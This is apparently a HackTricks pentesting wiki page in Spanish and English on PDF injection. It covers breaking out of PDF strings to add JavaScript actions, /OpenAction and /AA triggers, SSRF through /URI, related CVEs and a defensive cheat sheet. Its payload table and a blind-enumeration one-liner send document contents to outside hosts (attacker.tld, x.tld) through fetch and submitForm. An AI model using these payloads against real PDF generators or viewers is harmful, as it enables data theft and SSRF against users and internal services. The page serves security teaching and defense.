# PDF Injection

{{#include ../../banners/hacktricks-training.md}}

**Si tu entrada se refleja dentro de un archivo PDF, puedes intentar inyectar datos PDF para ejecutar JavaScript, realizar SSRF o robar el contenido del PDF.**
La sintaxis de PDF es extremadamente permisiva – si puedes salir de la string o del dictionary que está embebiendo tu entrada, puedes añadir objetos totalmente nuevos (o nuevas keys en el mismo objeto) que Acrobat/Chrome analizará sin problema.
Since 2024 a wave of bug-bounty reports have shown that *one unescaped parenthesis or back-slash is enough* for full script execution.

## TL;DR – Flujo de ataque moderno (2024-2026)
1. Encuentra cualquier valor controlado por el usuario que termine dentro de una **(parenthesis string)**, `/URI ( … )` o `/JS ( … )` field en el PDF generado.
2. Inyecta `) ` (cerrando la string) seguido de uno de los primitives abajo y termina con otro paréntesis de apertura para mantener la sintaxis válida.
3. Entrega el PDF malicioso a una víctima (o a un servicio backend que renderice automáticamente el archivo – ideal para bugs ciegos).
4. Tu payload se ejecuta en el viewer de PDF:
* Chrome / Edge → PDFium Sandbox
* Firefox → PDF.js (ver CVE-2024-4367)
* Acrobat → API de JavaScript completa (puede exfiltrar contenidos arbitrarios de archivos con `this.getPageNthWord`)

Example (annotation link hijack):
```pdf
(https://victim.internal/) ) /A << /S /JavaScript /JS (app.alert("PDF pwned")) >> /Next (
```
*The first `)` closes the original URI string, we then add a new **Action** dictionary that Acrobat will execute when the user clicks the link.*

## Primitivas de inyección útiles
| Objetivo | Payload Snippet | Notas |
|------|-----------------|-------|
| **JavaScript on open** | `/OpenAction << /S /JavaScript /JS (app.alert(1)) >>` | Se ejecuta inmediatamente cuando se abre el documento (funciona en Acrobat, no en Chrome). |
| **JavaScript on link** | `/A << /S /JavaScript /JS (fetch('https://attacker.tld/?c='+this.getPageNumWords(0))) >>` | Funciona en PDFium & Acrobat si controlas una anotación `/Link`. |
| **Blind data exfiltration** | `<< /Type /Action /S /URI /URI (https://attacker.tld/?leak=)` | Combínalo con `this.getPageNthWord` dentro de JS para robar contenido. |
| **Server-Side SSRF** | Same as above but target an internal URL – great when the PDF is rendered by back-office services that honour `/URI`. | Igual que arriba pero apunta a una URL interna — útil cuando el PDF es renderizado por servicios back-office que respetan `/URI`. |
| **Additional Actions (/AA)** | `/AA << /O << /S /JavaScript /JS (app.alert(1)) >> >>` | Adjuntarlo a un diccionario Page/Annotation/Form para ejecutarse al abrir/enfocar. |
| **Line Break for new objects** | `\nendobj\n10 0 obj\n<< /S /JavaScript /JS (app.alert(1)) >>\nendobj` | Si la librería te permite inyectar caracteres de nueva línea puedes crear objetos totalmente nuevos. |

## Acciones embebidas como objetivos de inyección
PDF viewers treat **embedded actions** such as `/OpenAction` and `/AA` (Additional Actions) as first-class features that can run when a document opens or when a specific event fires. If you can inject into any dictionary that accepts actions (Catalog, Page, Annotation, or Form field), you can graft an `/AA` tree and trigger JavaScript on open/focus.

Example payload for **generator-side object injection** (close the original string/dictionary and inject `/AA`):
```pdf
) >> /AA << /O << /S /JavaScript /JS (app.alert('AA fired')) >> >> (
```
Este patrón coincide con problemas recientes de jsPDF en los que una entrada controlada por el atacante pasada a `addJS` (o ciertos campos AcroForm) rompe la cadena JavaScript prevista e inyecta un diccionario **Additional Action**.

## Blind Enumeration Trick
Gareth Heyes (PortSwigger) publicó un comando de una sola línea que enumera todos los objetos dentro de un documento desconocido – útil cuando no puedes ver el PDF generado:
```pdf
) /JS (for(i in this){try{this.submitForm('https://x.tld?'+i+'='+this[i])}catch(e){}}) /S /JavaScript /A << >> (
```
El código itera sobre el Acrobat DOM y realiza solicitudes salientes para cada par propiedad/valor, proporcionándote un volcado *JSON-ish* del archivo. Consulta el white-paper “Portable Data **ex**Filtration” para la técnica completa.

## Errores en el mundo real (2023-2026)
* **CVE-2026-25755** – jsPDF `addJS` PDF object injection: cadenas controladas por el atacante pueden cerrar el literal JS e inyectar `/AA` → `/O` → `/JavaScript` actions que se ejecutan al abrir/enfocar.
* **CVE-2024-4367** – Arbitrary JavaScript execution in Firefox’s PDF.js prior to 4.2.67 bypassed the sandbox with a crafted `/JavaScript` action.
* **Bug bounty 2024-05** – Una fintech importante permitió notas de factura suministradas por clientes que aterrizaron en `/URI`; informe pagado con $10k tras demostrarse SSRF hacia un host de metadata interno usando `file:///` URI.
* **CVE-2023-26155** – `node-qpdf` command-injection vía ruta de PDF sin sanear, muestra la importancia de escapar backslashes y paréntesis incluso *antes* de la capa PDF.

## Hoja de referencia defensiva
1. **Nunca concatenes entrada de usuario sin procesar** dentro de cadenas o nombres `(`…`)`. Escapa `\`, `(`, `)` según lo requerido por §7.3 de la especificación PDF o usa hex strings `<...>`.
2. Si construyes enlaces, prefiere `/URI (https://…)` que codifiques completamente la URL; bloquea esquemas `javascript:` en los visores cliente.
3. Elimina o valida los diccionarios `/OpenAction`, `/AA` (acciones adicionales), `/Launch`, `/SubmitForm` y `/ImportData` al postprocesar PDFs.
4. En el lado del servidor, renderiza PDFs no confiables con un *headless converter* (p. ej. qpdf –decrypt –linearize) que elimine JavaScript y acciones externas.
5. Mantén los visores de PDF actualizados; PDF.js < 4.2.67 y Acrobat Reader anteriores a los parches de julio de 2024 permiten ejecución trivial de código.
6. Si usas generadores client-side (p. ej., jsPDF), nunca pases entradas no confiables a `addJS` o a los setters de AcroForm que terminen dentro de diccionarios de acciones PDF.

## Referencias
* Gareth Heyes, “Portable Data exFiltration – XSS for PDFs”, PortSwigger Research (actualizado mayo de 2024). <https://portswigger.net/research/portable-data-exfiltration>
* Dawid Ryłko, “CVE-2024-4367: Arbitrary JavaScript Execution in PDF.js” (abr 2024). <https://dawid.dev/sec/cve-2024-4367-arbitrary-javascript-execution-in-pdf-js>
* GitLab Advisory Database, “CVE-2026-25755: jsPDF has a PDF Object Injection via Unsanitized Input in addJS Method” (feb 2026). <https://advisories.gitlab.com/pkg/npm/jspdf/CVE-2026-25755/>
* Adobe Acrobat Help, “Acrobat shows a warning message when signing documents” (sep 2025) – acciones incrustadas como OpenAction/AA. <https://helpx.adobe.com/acrobat/kb/embedded-action-signing-warning.html>
{{#include ../../banners/hacktricks-training.md}}
